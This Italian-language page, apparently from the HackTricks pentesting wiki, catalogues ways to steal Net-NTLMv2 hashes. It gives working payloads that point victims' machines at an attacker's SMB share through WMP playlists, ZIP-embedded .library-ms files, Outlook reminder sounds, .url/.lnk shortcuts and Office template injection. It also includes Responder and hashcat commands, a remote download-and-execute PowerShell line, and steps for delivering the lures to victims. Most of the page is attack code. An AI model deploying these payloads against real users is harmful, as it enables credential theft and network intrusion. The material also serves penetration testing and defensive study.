# Luoghi per rubare NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Dai un'occhiata a tutte le ottime idee in [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — dal download di un microsoft word file online alla ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md e [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player playlists (.ASX/.WAX)

Se riesci a convincere un target ad aprire o visualizzare in anteprima una playlist di Windows Media Player che controlli, puoi leak Net‑NTLMv2 puntando l'entry a un UNC path. WMP tenterà di recuperare il media referenziato via SMB e si autenticherà implicitamente.

Esempio di payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Raccolta e cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer gestisce in modo insicuro i file .library-ms quando vengono aperti direttamente da un archivio ZIP. Se la definizione della library punta a un percorso UNC remoto (e.g., \\attacker\share), il semplice sfogliare/avviare il .library-ms dentro lo ZIP fa sì che Explorer enumeri l'UNC e invii autenticazione NTLM all'attaccante. Questo produce un NetNTLMv2 che può essere crackato offline o potenzialmente relayed.

Esempio minimo di .library-ms che punta a un UNC dell'attaccante
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operational steps
- Crea il file .library-ms con l'XML sopra (imposta il tuo IP/hostname).
- Comprimi in ZIP (on Windows: Send to → Compressed (zipped) folder) e consegna lo ZIP al target.
- Avvia un NTLM capture listener e attendi che la vittima apra il .library-ms dall'interno dello ZIP.


### Percorso del suono del promemoria del calendario di Outlook (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows processava la proprietà MAPI estesa PidLidReminderFileParameter negli elementi del calendario. Se quella proprietà punta a un percorso UNC (es. \\attacker\share\alert.wav), Outlook contatterebbe la SMB share quando il promemoria si attiva, causando il leaking del Net‑NTLMv2 dell'utente senza alcun click. Questo è stato patchato il 14 marzo 2023, ma resta ancora altamente rilevante per fleet legacy/non aggiornate e per la risposta agli incidenti storici.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lato del listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Note
- Una vittima deve avere solo Outlook for Windows in esecuzione quando il promemoria si attiva.
- Il leak produce Net‑NTLMv2 adatto per offline cracking o relay (non pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer rende automaticamente le icone dei shortcut. Ricerche recenti hanno mostrato che, anche dopo la patch di Microsoft di aprile 2025 per UNC‑icon shortcuts, era ancora possibile innescare l'autenticazione NTLM senza clic ospitando il target dello shortcut su un percorso UNC e mantenendo l'icona locale (bypass della patch assegnato CVE‑2025‑50154). Semplicemente visualizzare la cartella fa sì che Explorer recuperi i metadati dal target remoto, emettendo NTLM verso il server SMB dell'attaccante.

Payload minimo per Internet Shortcut (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload di collegamento a programma (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Modalità di consegna
- Metti il collegamento in uno ZIP e fai in modo che la vittima lo apra.
- Metti il collegamento su una share scrivibile che la vittima aprirà.
- Combina con altri file esca nella stessa cartella in modo che Explorer li visualizzi in anteprima.


### Office remote template injection (.docx/.dotm) to coerce NTLM

I documenti Office possono fare riferimento a un template esterno. Se imposti il template allegato su un percorso UNC, l'apertura del documento autenticherà verso SMB.

Modifiche minime alle relazioni DOCX (all'interno di word/):

1) Modifica word/settings.xml e aggiungi il riferimento al template allegato:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Modifica word/_rels/settings.xml.rels e punta rId1337 al tuo UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Ricompila in .docx e consegna. Avvia il tuo SMB capture listener e attendi l'apertura.

Per idee post-capture su relaying o abusing NTLM, consulta:

{{#ref}}
README.md
{{#endref}}


## Riferimenti
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
